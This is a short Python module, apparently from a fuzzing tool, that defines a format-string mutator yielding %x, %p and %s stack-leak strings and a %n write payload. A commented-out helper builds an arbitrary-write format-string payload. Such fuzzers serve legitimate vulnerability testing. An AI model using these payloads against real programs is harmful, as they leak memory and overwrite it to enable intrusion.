from pwn import *
from mutators.base_mutator import BaseMutator

# def make_fmt_str(stack_offset, where, what):
#     payload = b"BAAAA"
#     payload += p32(where + 0)
#     payload += p32(where + 1)
#     payload += p32(where + 2)
#     payload += p32(where + 3)
#     payload += f"%{256-21}c".encode()
#     for i in range(4):
#         byte = what & 0xff
#         what >>= 8
#         if byte == 0:
#             payload += f"%{stack_offset + i}$hhn".encode()
#         else:
#             payload += f"%{byte}c".encode()
#             payload += f"%{stack_offset + i}$hhn".encode()
#             payload += f"%{256-byte}c".encode()
#     return payload

class FormatStringMutator(BaseMutator):
    def __init__(self, input_str: str = ""):
        super().__init__(input_str)
    
    def mutate(self) -> str:
        """
        Can be a generator:
        mutator = Mutator("some_strings")
        for mutated_str in mutator.mutate():
            do_stuff(mutated_str)
        """
        #Format string to find stack offset
        classic_x = self.input_str + ("AAAAAA" + "%x"*100)
        yield classic_x
        #Format string %p
        classic_p = self.input_str + ("AAAAAA" + "%p"*100)
        yield classic_p
        #Format string %s
        classic_s = self.input_str + ("AAAAAA" + "%s"*100)
        yield classic_s
        #Format string %n
        payload = b"\x78\x45\x34\x12%150x%12$hhn"
        classic_n = self.input_str + payload.decode("utf-8")
        
        yield classic_n